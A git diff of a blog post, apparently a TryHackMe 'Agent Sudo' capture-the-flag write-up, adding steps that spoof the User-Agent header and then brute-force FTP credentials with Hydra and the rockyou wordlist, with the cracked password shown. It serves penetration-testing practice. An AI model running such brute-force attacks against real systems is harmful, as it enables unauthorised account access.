@@ -1,11 +1,11 @@
 ---
 layout: post
 title:  "THM writeup - Agent Sudo"
-date:   2021-07-05 15:09:43 +0100
+date:   2021-07-14 15:09:43 +0100
 categories: post update
 ---
 
-Writeup on the TryHackMe room Agent Sudo.
+Writeup on the TryHackMe room "Agent Sudo".
 
 [Link to room.](https://tryhackme.com/room/agentsudoctf)
 
@@ -39,3 +39,31 @@ Checking out the site on port 80 we have the following:
 ![](../_assets/2021-07-14-12-00-22.png)
 
 The mention of ```user-agent``` is probably a hint.
+```User-Agent``` is one of the headers used for sending HTTP requests.
+It will typically contain the browser name/type that is sending the request.
+
+After some searching for a Firefox plugin to allow us to change this, we start fuzzing the user-agent.
+There are no results with setting ```codename``` or ```Agent R``` as the user-agent, however we do get a different result with just ```R``` as the User-Agent.
+
+Using the hint of changing user-agent to 'C' we get the following page, which provides a possible username, as well as hint for a weak password being used.
+
+```
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R 
+```
+Using Hydra we can attempt a brute force using this username against the FTP port.
+
+```
+# hydra -l chris -P ~/rockyou.txt -vV 10.10.86.99 ftp
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+<---snip-->
+[21][ftp] host: 10.10.86.99   login: chris   password: crystal
+[STATUS] attack finished for 10.10.86.99 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+```
